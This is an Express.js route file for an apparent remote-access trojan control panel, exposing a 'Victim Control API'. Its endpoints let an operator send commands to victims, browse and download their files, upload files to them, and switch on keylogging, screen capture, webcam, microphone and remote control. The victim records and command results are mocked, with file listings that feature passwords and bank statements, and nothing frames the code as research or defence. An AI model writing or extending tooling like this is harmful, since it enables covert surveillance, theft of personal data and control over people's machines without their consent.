/**
 * Victim Control API Routes
 * Handles all victim management and control endpoints
 */

import express from 'express';
import multer from 'multer';
import { v4 as uuidv4 } from 'uuid';
import { body, validationResult } from 'express-validator';
import path from 'path';
import fs from 'fs';

const router = express.Router();

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = './uploads/victims';
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}-${file.originalname}`);
  }
});

const upload = multer({ 
  storage,
  limits: { fileSize: 100 * 1024 * 1024 }, // 100MB limit
  fileFilter: (req, file, cb) => {
    // Allow all file types for victim file operations
    cb(null, true);
  }
});

// Mock victim data storage
let victims = new Map([
  ['Target_User_001', {
    id: 'Target_User_001',
    name: 'Target_User_001',
    ip: '192.168.1.50',
    location: 'Hà Nội, VN',
    device: 'Windows 11 - Chrome 120',
    status: 'online',
    lastSeen: new Date(),
    sessions: 3,
    data: '2.1GB',
    actions: {
      screen: true,
      keylog: false,
      webcam: false,
      mic: false,
      control: true
    },
    systemInfo: {
      cpu: 'Intel Core i7-10700K @ 3.80GHz',
      ram: '16 GB DDR4',
      storage: '512 GB SSD + 1 TB HDD',
      gpu: 'NVIDIA GeForce RTX 3070',
      os: 'Windows 11 Pro',
      architecture: 'x64',
      uptime: '2 days, 14 hours'
    },
    networkInfo: {
      publicIp: '192.168.1.50',
      privateIp: '192.168.1.105',
      mac: '00:1B:44:11:3A:B7',
      gateway: '192.168.1.1',
      dns: ['8.8.8.8', '1.1.1.1'],
      bandwidth: '100 Mbps'
    },
    securityInfo: {
      antivirus: 'Windows Defender',
      firewall: 'Enabled',
      uac: 'Enabled',
      lastScan: new Date(Date.now() - 24 * 60 * 60 * 1000)
    }
  }],
  ['Target_User_002', {
    id: 'Target_User_002',
    name: 'Target_User_002',
    ip: '192.168.1.51',
    location: 'TP.HCM, VN',
    device: 'Windows 10 - Firefox 121',
    status: 'offline',
    lastSeen: new Date(Date.now() - 30 * 60 * 1000),
    sessions: 1,
    data: '850MB',
    actions: {
      screen: false,
      keylog: true,
      webcam: false,
      mic: false,
      control: false
    },
    systemInfo: {
      cpu: 'AMD Ryzen 5 3600',
      ram: '8 GB DDR4',
      storage: '256 GB SSD',
      gpu: 'AMD Radeon RX 580',
      os: 'Windows 10 Home',
      architecture: 'x64',
      uptime: '5 hours'
    },
    networkInfo: {
      publicIp: '192.168.1.51',
      privateIp: '192.168.1.106',
      mac: '00:1B:44:11:3A:B8',
      gateway: '192.168.1.1',
      dns: ['8.8.8.8', '8.8.4.4'],
      bandwidth: '50 Mbps'
    },
    securityInfo: {
      antivirus: 'Avast Free',
      firewall: 'Enabled',
      uac: 'Disabled',
      lastScan: new Date(Date.now() - 48 * 60 * 60 * 1000)
    }
  }]
]);

// Command history storage
let commandHistory = new Map();

// Get all victims
router.get('/', (req, res) => {
  const victimList = Array.from(victims.values()).map(victim => ({
    id: victim.id,
    name: victim.name,
    ip: victim.ip,
    location: victim.location,
    device: victim.device,
    status: victim.status,
    lastSeen: victim.lastSeen,
    sessions: victim.sessions,
    data: victim.data,
    actions: victim.actions
  }));

  res.json({
    success: true,
    data: victimList,
    total: victimList.length,
    timestamp: new Date().toISOString()
  });
});

// Get victim details
router.get('/:id', (req, res) => {
  const { id } = req.params;
  const victim = victims.get(id);

  if (!victim) {
    return res.status(404).json({
      success: false,
      message: 'Victim not found'
    });
  }

  res.json({
    success: true,
    data: victim,
    timestamp: new Date().toISOString()
  });
});

// Send command to victim
router.post('/:id/commands', [
  body('command').notEmpty().withMessage('Command is required'),
  body('params').optional().isObject()
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      errors: errors.array()
    });
  }

  const { id } = req.params;
  const { command, params = {} } = req.body;

  const victim = victims.get(id);
  if (!victim) {
    return res.status(404).json({
      success: false,
      message: 'Victim not found'
    });
  }

  if (victim.status !== 'online') {
    return res.status(400).json({
      success: false,
      message: 'Victim is not online'
    });
  }

  const commandId = uuidv4();
  const commandRecord = {
    id: commandId,
    victimId: id,
    command,
    params,
    timestamp: new Date(),
    status: 'executing',
    result: null
  };

  // Store command history
  if (!commandHistory.has(id)) {
    commandHistory.set(id, []);
  }
  commandHistory.get(id).unshift(commandRecord);

  // Simulate command execution
  setTimeout(() => {
    const result = simulateCommandExecution(command, params);
    commandRecord.status = 'completed';
    commandRecord.result = result;
    commandRecord.completedAt = new Date();
  }, Math.random() * 2000 + 500);

  res.json({
    success: true,
    data: {
      commandId,
      status: 'executing',
      message: `Command '${command}' sent to victim ${id}`
    }
  });
});

// Get victim file system
router.get('/:id/filesystem', (req, res) => {
  const { id } = req.params;
  const { path: requestedPath = 'C:\\' } = req.query;

  const victim = victims.get(id);
  if (!victim) {
    return res.status(404).json({
      success: false,
      message: 'Victim not found'
    });
  }

  // Mock file system structure
  const mockFileSystem = generateMockFileSystem(requestedPath);

  res.json({
    success: true,
    data: {
      currentPath: requestedPath,
      files: mockFileSystem,
      permissions: {
        read: true,
        write: true,
        execute: true
      }
    },
    timestamp: new Date().toISOString()
  });
});

// Download file from victim
router.post('/:id/download', [
  body('filePath').notEmpty().withMessage('File path is required')
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      errors: errors.array()
    });
  }

  const { id } = req.params;
  const { filePath } = req.body;

  const victim = victims.get(id);
  if (!victim) {
    return res.status(404).json({
      success: false,
      message: 'Victim not found'
    });
  }

  // Simulate file download
  const downloadId = uuidv4();
  const fileName = path.basename(filePath);

  res.json({
    success: true,
    data: {
      downloadId,
      fileName,
      filePath,
      size: Math.floor(Math.random() * 10000000), // Random file size
      downloadUrl: `/api/victims/${id}/downloads/${downloadId}`,
      expiresAt: new Date(Date.now() + 60 * 60 * 1000) // 1 hour
    },
    message: 'File download initiated'
  });
});

// Upload file to victim
router.post('/:id/upload', upload.single('file'), (req, res) => {
  const { id } = req.params;
  const { targetPath } = req.body;

  const victim = victims.get(id);
  if (!victim) {
    return res.status(404).json({
      success: false,
      message: 'Victim not found'
    });
  }

  if (!req.file) {
    return res.status(400).json({
      success: false,
      message: 'No file uploaded'
    });
  }

  const uploadId = uuidv4();

  res.json({
    success: true,
    data: {
      uploadId,
      fileName: req.file.originalname,
      targetPath: targetPath || `C:\\Users\\Public\\${req.file.originalname}`,
      size: req.file.size,
      status: 'uploading'
    },
    message: 'File upload initiated'
  });
});

// Get command history
router.get('/:id/commands/history', (req, res) => {
  const { id } = req.params;
  const { limit = 50 } = req.query;

  const victim = victims.get(id);
  if (!victim) {
    return res.status(404).json({
      success: false,
      message: 'Victim not found'
    });
  }

  const history = commandHistory.get(id) || [];
  const limitedHistory = history.slice(0, parseInt(limit));

  res.json({
    success: true,
    data: limitedHistory,
    total: history.length,
    timestamp: new Date().toISOString()
  });
});

// Update victim actions (screen, keylog, etc.)
router.put('/:id/actions', [
  body('actions').isObject().withMessage('Actions must be an object')
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      errors: errors.array()
    });
  }

  const { id } = req.params;
  const { actions } = req.body;

  const victim = victims.get(id);
  if (!victim) {
    return res.status(404).json({
      success: false,
      message: 'Victim not found'
    });
  }

  // Update actions
  victim.actions = { ...victim.actions, ...actions };
  victim.lastSeen = new Date();
  victims.set(id, victim);

  res.json({
    success: true,
    data: victim.actions,
    message: 'Victim actions updated successfully'
  });
});

// Simulate command execution
function simulateCommandExecution(command, params) {
  const results = {
    screenshot: {
      success: true,
      data: {
        imageUrl: `/screenshots/${uuidv4()}.png`,
        timestamp: new Date().toISOString(),
        resolution: '1920x1080'
      }
    },
    navigate: {
      success: true,
      data: {
        url: params.url || 'https://example.com',
        title: 'Example Page',
        loadTime: Math.floor(Math.random() * 3000) + 500
      }
    },
    click: {
      success: true,
      data: {
        element: params.selector || 'button',
        coordinates: { x: params.x || 100, y: params.y || 200 }
      }
    },
    type: {
      success: true,
      data: {
        text: params.text || 'Sample text',
        element: params.selector || 'input'
      }
    },
    execute: {
      success: true,
      data: {
        script: params.script || 'console.log("Hello World")',
        result: 'Script executed successfully'
      }
    },
    system_info: {
      success: true,
      data: {
        cpu: 'Intel Core i7-10700K @ 3.80GHz',
        memory: '16 GB',
        disk: '512 GB SSD',
        os: 'Windows 11 Pro'
      }
    }
  };

  return results[command] || {
    success: false,
    error: `Unknown command: ${command}`
  };
}

// Generate mock file system
function generateMockFileSystem(currentPath) {
  const mockFiles = [
    {
      name: 'Documents',
      type: 'folder',
      size: null,
      modified: new Date(Date.now() - 24 * 60 * 60 * 1000),
      permissions: 'rwx'
    },
    {
      name: 'Downloads',
      type: 'folder',
      size: null,
      modified: new Date(Date.now() - 12 * 60 * 60 * 1000),
      permissions: 'rwx'
    },
    {
      name: 'Desktop',
      type: 'folder',
      size: null,
      modified: new Date(Date.now() - 6 * 60 * 60 * 1000),
      permissions: 'rwx'
    },
    {
      name: 'passwords.txt',
      type: 'file',
      size: 2048,
      modified: new Date(Date.now() - 2 * 60 * 60 * 1000),
      permissions: 'rw-'
    },
    {
      name: 'browser_data.db',
      type: 'file',
      size: 15728640,
      modified: new Date(Date.now() - 30 * 60 * 1000),
      permissions: 'rw-'
    },
    {
      name: 'system.log',
      type: 'file',
      size: 524288,
      modified: new Date(Date.now() - 5 * 60 * 1000),
      permissions: 'r--'
    }
  ];

  // Add path-specific files
  if (currentPath.includes('Documents')) {
    mockFiles.push(
      {
        name: 'personal_info.docx',
        type: 'file',
        size: 45056,
        modified: new Date(Date.now() - 48 * 60 * 60 * 1000),
        permissions: 'rw-'
      },
      {
        name: 'bank_statements.pdf',
        type: 'file',
        size: 1048576,
        modified: new Date(Date.now() - 72 * 60 * 60 * 1000),
        permissions: 'rw-'
      }
    );
  }

  return mockFiles;
}

export default router;
